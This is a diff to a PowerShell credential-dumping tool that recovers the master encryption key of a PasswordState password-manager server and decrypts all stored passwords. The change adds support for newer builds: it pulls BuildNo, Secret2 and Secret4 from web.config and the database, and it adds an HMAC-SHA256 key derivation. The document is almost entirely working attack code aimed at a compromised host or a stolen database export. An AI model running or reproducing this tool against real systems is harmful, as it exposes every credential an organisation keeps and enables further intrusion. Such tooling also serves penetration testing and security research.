@@ -21,8 +21,8 @@ function Invoke-PasswordStateDecryptor {
         * Moserware.SecretSplitter.dll somewhere (shipped in the repo or on the disk)
     An example of such a host is the PasswordState server itself. 
 
-    Alternatively, if you are able to compromise the database, export all entries to CSV
-    and the secret1 and secret3 or the encryption key, you can use the script offline. The
+    Alternatively, if you are able to compromise the database, export all entries to CSV, the build number
+    and the secret1, secret2, secret3 and secret4 values or the encryption key, you can use the script offline. The
     CSV should contain (at least) the following fields: UserName, Password, Description and Title
 
     .EXAMPLE
@@ -49,10 +49,6 @@ function Invoke-PasswordStateDecryptor {
     # use FIPSMode? Default is false.
     $FIPSMode = $false,
 
-    [boolean]
-    # reverse encryption key? Default is false.
-    $Reverse = $false,
-
     [string]
     # The connection string to the database. Default extracts from web.config.
     $ConnectionString,
@@ -62,8 +58,16 @@ function Invoke-PasswordStateDecryptor {
     $Secret1,
 
     [string]
+    # The Secret2 value. Default extracts from the web.config.
+    $Secret2,
+
+    [string]
     # The Secret3 value. Default extracts from the DB.
     $Secret3,
+
+    [string]
+    # The Secret4 value. Default extracts from the DB.
+    $Secret4,
 
     [string]
     # CSV file path, allows for offline decrypting. Requires either Secret1 and Secret3 or EncryptionKey parameters
@@ -72,7 +76,11 @@ function Invoke-PasswordStateDecryptor {
     [string]
     # Encryption key. Default combines both secrets. The key should be hex encoded, 
     # like "56a6806d61ee9eb8c4c9cb6b153f6a7a470c2966aae7a2a7d83f0acd6507bfa1"
-    $EncryptionKey
+    $EncryptionKey,
+
+    [int]
+    # Build Number to determine which key derivation algorithm to use
+    $BuildNo
 
     )
 
@@ -92,16 +100,32 @@ function Invoke-PasswordStateDecryptor {
                 Write-Host -ForegroundColor Green "Found Connection String: $ConnectionString"
             }
 
+            if (-not $PSBoundParameters.ContainsKey('BuildNo')) {
+                $BuildNo = (Invoke-SQL -connectionString $ConnectionString -sqlCommand "SELECT BuildNo FROM SystemSettings").BuildNo
+                Write-Host -ForegroundColor Green "Found BuildNo: $BuildNo"
+            }
+
             # Get Secret1 from web.config if encryption key is not set.
             if ((-not $PSBoundParameters.ContainsKey('Secret1')) -and (-not $PSBoundParameters.ContainsKey('EncryptionKey'))) {
                 $Secret1 = $configXML.SelectSingleNode('/configuration/appSettings/add[@key="Secret1"]').value
                 Write-Host -ForegroundColor Green "Found Secret1: $Secret1"
+                # Build 9700 and above requires Secret2
+                if (($BuildNo -ge 9700) -and (-not $PSBoundParameters.ContainsKey('Secret2'))) {
+                    $Secret2 = $configXML.SelectSingleNode('/configuration/appSettings/add[@key="Secret2"]').value
+                    Write-Host -ForegroundColor Green "Found Secret2: $Secret2"
+                }
             }
 
             # Get Secret3 from DB if encryption key is not set.
             if ((-not $PSBoundParameters.ContainsKey('Secret3')) -and (-not $PSBoundParameters.ContainsKey('EncryptionKey'))) {
-                $Secret3 = (Invoke-SQL -connectionString $ConnectionString -sqlCommand "SELECT secret3 FROM SystemSettings").secret3
+                $secrets = Invoke-SQL -connectionString $ConnectionString -sqlCommand "SELECT secret3, secret4 FROM SystemSettings"
+                $Secret3 = $secrets.secret3
                 Write-Host -ForegroundColor Green "Found Secret3: $Secret3"
+                # Build 9700 and above requires Secret4
+                if (($BuildNo -ge 9700) -and (-not $PSBoundParameters.ContainsKey('Secret4'))) {
+                    $Secret4 = $secrets.secret4
+                    Write-Host -ForegroundColor Green "Found Secret4: $Secret4"
+                }
             }
 
             # Get all entries from the database
@@ -110,12 +134,21 @@ function Invoke-PasswordStateDecryptor {
         
         } else {
             # web.config is not given
+
+            # Build Number is required to determine key derivation algorithm
+            if (-not $PSBoundParameters.ContainsKey('BuildNo')) {
+                # alternative would be to default to a BuildNo like 9700
+                throw "BuildNo is a required parameter in offline mode."
+            }
+
             # we need an encryption key or secret1 and secret3 value.
             if (-not $PSBoundParameters.ContainsKey('EncryptionKey')) {
                 # encryptionkey not set
-                if (-not ($PSBoundParameters.ContainsKey('Secret1')) -or (-not $PSBoundParameters.ContainsKey('Secret3'))) {
+                if (($BuildNo -ge 9700) -and ((-not $PSBoundParameters.ContainsKey('Secret1')) -or (-not $PSBoundParameters.ContainsKey('Secret2')) -or (-not $PSBoundParameters.ContainsKey('Secret3')) -or (-not $PSBoundParameters.ContainsKey('Secret4')))) {
+                    throw "EncryptionKey or Secret1, Secret2, Secret3 and Secret4 are required parameters in offline mode for builds >= 9700."
+                } elseif (-not ($PSBoundParameters.ContainsKey('Secret1')) -or (-not $PSBoundParameters.ContainsKey('Secret3'))) {
                     # secret1 or secret3 is not set
-                    throw "EncryptionKey or Secret1 and Secret3 are required parameters in offline mode."
+                    throw "EncryptionKey or Secret1 and Secret3 are required parameters in offline mode for builds < 9700."
                 }
             }
 
@@ -141,12 +174,28 @@ function Invoke-PasswordStateDecryptor {
                 throw "SecretSplitterDLL was not found!"
                 exit
             }
-            
+
             # Combine secrets and return recovered Text String
             $EncryptionKey = [Moserware.Security.Cryptography.SecretCombiner]::Combine($Secret1 + "`n" + $Secret3).RecoveredTextString
-            # For versions >= 8903 the key needs to be reverse
-            if ($Reverse) {
-                $EncryptionKey = $EncryptionKey[-1..-$EncryptionKey.Length ] -join ""
+            switch ($BuildNo) {
+                {$_ -lt 8903} {
+                    break
+                }
+                {$_ -lt 9700} {
+                    # For versions >= 8903 and < 9700 the key needs to be reversed
+                    $EncryptionKey = $EncryptionKey[-1..-$EncryptionKey.Length ] -join ""
+                    break
+                }
+                {$_ -ge 9700} {
+                    # For versions >= 9700 the key is the HMAC of the original encryption key
+                    $HMACKey = [Moserware.Security.Cryptography.SecretCombiner]::Combine($Secret2 + "`n" + $Secret4).RecoveredTextString
+                    $RawHMACKey = Convert-HexStringToByteArray $HMACKey
+                    # Perform HMAC-SHA256
+                    $HMAC = New-Object System.Security.Cryptography.HMACSHA256
+                    $HMAC.key = $RawHMACKey
+                    $EncryptionKey = ($HMAC.ComputeHash((Convert-HexStringToByteArray $EncryptionKey)) | ForEach-Object ToString X2) -join ''
+                    break
+                }
             }
             Write-Host -ForegroundColor Green "Recovered Encryption Key: $EncryptionKey!"
         }
